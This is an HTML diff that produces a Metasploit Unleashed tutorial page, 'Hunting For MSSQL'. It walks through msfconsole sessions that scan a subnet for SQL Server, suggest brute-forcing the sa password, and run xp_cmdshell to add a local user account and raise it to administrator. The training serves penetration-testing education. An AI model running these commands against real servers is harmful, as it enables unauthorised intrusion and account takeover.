@@ -2,7 +2,7 @@
 		<!DOCTYPE html>
 		<html xmlns="" xml:lang="en" lang="en" dir="ltr">
 		<head>
-			<title>Metasploit Unleashed</title>
+			<title>Hunting For MSSQL - Metasploit Unleashed</title>
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/reset.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/style.css" />
 			<link rel="stylesheet" href="http://www.offensive-security.com/w/skins/msfu/main.css" />
@@ -25,10 +25,10 @@
 						
 						<div id="controls">
 									<ul>
-			<li id="ca-nstab-main" class="selected"><a href="Port_Scanners" title="View the content page [c]" accesskey="c">Page</a></li>
-			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Main_Page&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
-			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
-			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
+			<li id="ca-nstab-main" class="selected"><a href="Hunting_For_MSSQL" title="View the content page [c]" accesskey="c">Page</a></li>
+			<li id="ca-talk" class="new"><a href="http://www.offensive-security.com/w/index.php?title=Talk:Hunting_For_MSSQL&amp;action=edit&amp;redlink=1" title="Discussion about the content page [t]" accesskey="t">Discussion</a></li>
+			<li id="ca-viewsource"><a href="http://www.offensive-security.com/w/index.php?title=Hunting_For_MSSQL&amp;action=edit" title="This page is protected.&#10;You can view its source [e]" accesskey="e">View source</a></li>
+			<li id="ca-history"><a href="http://www.offensive-security.com/w/index.php?title=Hunting_For_MSSQL&amp;action=history" title="Past revisions of this page [h]" accesskey="h">History</a></li>
 		</ul>
 							
 							<div class="portlet" id="p-personal">
@@ -57,36 +57,260 @@
 						<a id="top"></a>
 						
 						<div id="content">
-							<h1>Metasploit Unleashed</h1>
+							<h1>Hunting For MSSQL</h1>
 						
 							<div id="siteSub">From Metasploit Unleashed</div>
 							<div id="contentSub"></div>
-																													<div id="jump-to-nav">Jump to: <a href="Port_Scanners#column-one">navigation</a>, <a href="Port_Scanners#searchInput">search</a></div>
+																													<div id="jump-to-nav">Jump to: <a href="Hunting_For_MSSQL#column-one">navigation</a>, <a href="Hunting_For_MSSQL#searchInput">search</a></div>
 														<!-- start content -->
-							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>This free information security training is brought to you in a community effort to promote awareness and raise funds for underprivileged children in East Africa. Through a heart-warming effort by several security professionals, we are proud to present the most complete and in-depth open course about the Metasploit Framework.
+							<div id="mw-content-text" lang="en" dir="ltr" class="mw-content-ltr"><p>Searching and locating MSSQL installations inside the internal network can be achieved using UDP foot-printing. When MSSQL installs, it installs either on port 1433 TCP or a randomized dynamic TCP port. If the port is dynamically attributed, querying UDP port 1434 will provide us with information on the server including the TCP port on which the service is listening. 
+<br />
+Let us search and load the MSSQL ping module inside the msfconsole.
+<br />
+<br />
+<pre>msf > <span style='color:#13C16A;'>search mssql</span>
+
+Exploits
+========
+
+   Name                                       Description
+   ----                                       -----------
+   windows/mssql/lyris_listmanager_weak_pass  Lyris ListManager MSDE Weak sa Password
+   windows/mssql/ms02_039_slammer             Microsoft SQL Server Resolution Overflow
+   windows/mssql/ms02_056_hello               Microsoft SQL Server Hello Overflow
+   windows/mssql/mssql_payload                Microsoft SQL Server Payload Execution
+
+
+Auxiliary
+=========
+
+   Name                       Description
+   ----                       -----------
+   admin/mssql/mssql_enum     Microsoft SQL Server Configuration Enumerator
+   admin/mssql/mssql_exec     Microsoft SQL Server xp_cmdshell Command Execution
+   admin/mssql/mssql_sql      Microsoft SQL Server Generic Query
+   scanner/mssql/mssql_login  MSSQL Login Utility
+   scanner/mssql/mssql_ping   MSSQL Ping Utility
+
+msf > <span style='color:#13C16A;'>use auxiliary/scanner/mssql/mssql_ping</span>
+msf auxiliary(<span style='color:#ff0000;'>mssql_ping</span>) > <span style='color:#13C16A;'>show options</span>
+
+Module options (auxiliary/scanner/mssql/mssql_ping):
+
+   Name                 Current Setting  Required  Description
+   ----                 ---------------  --------  -----------
+   PASSWORD                              no        The password for the specified username
+   RHOSTS                                yes       The target address range or CIDR identifier
+   THREADS              1                yes       The number of concurrent threads
+   USERNAME             sa               no        The username to authenticate as
+   USE_WINDOWS_AUTHENT  false            yes       Use windows authentification
+
+msf auxiliary(<span style='color:#ff0000;'>mssql_ping</span>) > <span style='color:#13C16A;'>set RHOSTS 10.211.55.1/24</span>
+RHOSTS => 10.211.55.1/24
+msf auxiliary(<span style='color:#ff0000;'>mssql_ping</span>) > <span style='color:#13C16A;'>exploit</span>
+
+<span style='color:#0000FF;'>[*]</span> SQL Server information for 10.211.55.128:
+<span style='color:#0000FF;'>[*]</span> tcp = 1433
+<span style='color:#0000FF;'>[*]</span> np = SSHACKTHISBOX-0pipesqlquery
+<span style='color:#0000FF;'>[*]</span> Version = 8.00.194
+<span style='color:#0000FF;'>[*]</span> InstanceName = MSSQLSERVER
+<span style='color:#0000FF;'>[*]</span> IsClustered = No
+<span style='color:#0000FF;'>[*]</span> ServerName = SSHACKTHISBOX-0
+<span style='color:#0000FF;'>[*]</span> Auxiliary module execution completed</pre>
+<br />
+The first command we issued was to search for any 'mssql' plugins. The second set of instructions was the 'use scanner/mssql/mssql_ping', this will load the scanner module for us. 
+<br />
+<br />
+Next, 'show options' allows us to see what we need to specify. The 'set RHOSTS 10.211.55.1/24' sets the subnet range we want to start looking for SQL servers on. You could specify a /16 or whatever you want to go after. We would recommend increasing the number of threads as this could take a long time with a single threaded scanner.
+<br />
+<br />
+After the 'run' command is issued, a scan is going to be performed and pull back specific information about the MSSQL server. As we can see, the name of the machine is "SSHACKTHISBOX-0" and the TCP port is running on 1433. 
+<br />
+<br />
+At this point you could use the 'scanner/mssql/mssql_login' module to brute-force the password by passing the module a dictionary file. Alternatively, you could also use Fast-Track, medusa, or hydra to do this. Once you successfully guess the password, there's a neat little module for executing the xp_cmdshell stored procedure.
+<br />
+<br />
+<pre>msf auxiliary(<span style='color:#ff0000;'>mssql_login</span>) > <span style='color:#13C16A;'>use auxiliary/admin/mssql/mssql_exec</span>
+msf auxiliary(<span style='color:#ff0000;'>mssql_exec</span>) > <span style='color:#13C16A;'>show options</span>
+
+Module options (auxiliary/admin/mssql/mssql_exec):
+
+   Name                 Current Setting                       Required  Description
+   ----                 ---------------                       --------  -----------
+   CMD                  cmd.exe /c echo OWNED > C:\owned.exe  no        Command to execute
+   PASSWORD                                                   no        The password for the specified username
+   RHOST                                                      yes       The target address
+   RPORT                1433                                  yes       The target port
+   USERNAME             sa                                    no        The username to authenticate as
+   USE_WINDOWS_AUTHENT  false                                 yes       Use windows authentification
+
+
+msf auxiliary(<span style='color:#ff0000;'>mssql_exec</span>) > <span style='color:#13C16A;'>set RHOST 10.211.55.128</span>
+RHOST => 10.211.55.128
+msf auxiliary(<span style='color:#ff0000;'>mssql_exec</span>) > <span style='color:#13C16A;'>set MSSQL_PASS password</span>
+MSSQL_PASS => password
+msf auxiliary(<span style='color:#ff0000;'>mssql_exec</span>) > <span style='color:#13C16A;'>set CMD net user bacon ihazpassword /ADD</span>
+cmd => net user rel1k ihazpassword /ADD
+msf auxiliary(<span style='color:#ff0000;'>mssql_exec</span>) > <span style='color:#13C16A;'>exploit</span>
+
+The command completed successfully.
+
+<span style='color:#0000FF;'>[*]</span> Auxiliary module execution completed</pre>
+<br />
+Looking at the output of the 'net user bacon ihazpassword /ADD', we have successfully added a user account named "bacon", from there we could issue 'net localgroup administrators bacon /ADD' to get a local administrator on the system itself. We have full control over this system at this point. 
 <br />
 <br />
 </p>
-<div class="center"><div class="floatnone"><a href="File:Msfu_logo_3.png" class="image"><img alt="Msfu logo 3.png" src="http://www.offensive-security.com/w/images/f/f6/Msfu_logo_3.png" width="632" height="319" /></a></div></div>
+<hr />
 <p><br />
-<br />
-This is a free online course and if you enjoy it and find it useful, we ask that you make a donation to the HFC (Hackers For Charity), $9.00 will feed a child for a month, so any contribution is welcome. We hope you enjoy this course as much as we enjoyed making it.
-<br />
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total1"><a href="Information_Gathering" title="Information Gathering">Information Gathering</a> &gt; Hunting For MSSQL</div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+</p>
+<div class="Total2"><a href="Port_Scanning" title="Port Scanning">Port Scanning</a> &#124; <strong class="selflink">Hunting For MSSQL</strong> &#124; <a href="Service_Identification" title="Service Identification">Service Identification</a> &#124; <a href="Password_Sniffing" title="Password Sniffing">Password Sniffing</a> &#124; <a href="SNMP_Sweeping" title="SNMP Sweeping">SNMP Sweeping</a> &#124; <a href="Writing_Your_Own_Scanner" title="Writing Your Own Scanner">Writing Your Own Scanner</a></div>
+<p>
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
+
 </p>
 <!-- 
 NewPP limit report
-Preprocessor visited node count: 6/1000000
-Preprocessor generated node count: 20/1000000
-Post‐expand include size: 0/2097152 bytes
+Preprocessor visited node count: 501/1000000
+Preprocessor generated node count: 2625/1000000
+Post‐expand include size: 3982/2097152 bytes
 Template argument size: 0/2097152 bytes
-Highest expansion depth: 2/40
+Highest expansion depth: 3/40
 Expensive parser function count: 0/100
 -->
 
-<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:285-0!*!*!*!*!2!* and timestamp 20131123153816 -->
+<!-- Saved in parser cache with key MSFU_Mediawiki-msfum_:pcache:idhash:265-0!*!0!*!*!*!* and timestamp 20131123141918 -->
 </div><div class="printfooter">
-Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597">http://www.offensive-security.com/w/index.php?title=Main_Page&amp;oldid=1597</a>"</div>
-							<div id='catlinks' class='catlinks catlinks-allhidden'></div>							<!-- end content -->
+Retrieved from "<a href="http://www.offensive-security.com/w/index.php?title=Hunting_For_MSSQL&amp;oldid=1309">http://www.offensive-security.com/w/index.php?title=Hunting_For_MSSQL&amp;oldid=1309</a>"</div>
+							<div id='catlinks' class='catlinks'><div id="mw-normal-catlinks" class="mw-normal-catlinks"><a href="Special:Categories" title="Special:Categories">Category</a>: <ul><li><a href="http://www.offensive-security.com/w/index.php?title=Category:Information_Gathering&amp;action=edit&amp;redlink=1" class="new" title="Category:Information Gathering (page does not exist)">Information Gathering</a></li></ul></div></div>							<!-- end content -->
 													</div>
 						
 					</div>
@@ -521,4 +745,4 @@ document.write(unescape("%3Cscript src='" + gaJsHost + "google-analytics.com/ga.
 <script type="text/javascript">
 var pageTracker = _gat._getTracker("UA-1981501-1");
 pageTracker._trackPageview();
-</script><!-- Served in 0.151 secs. --></body></html>
+</script><!-- Served in 0.140 secs. --></body></html>
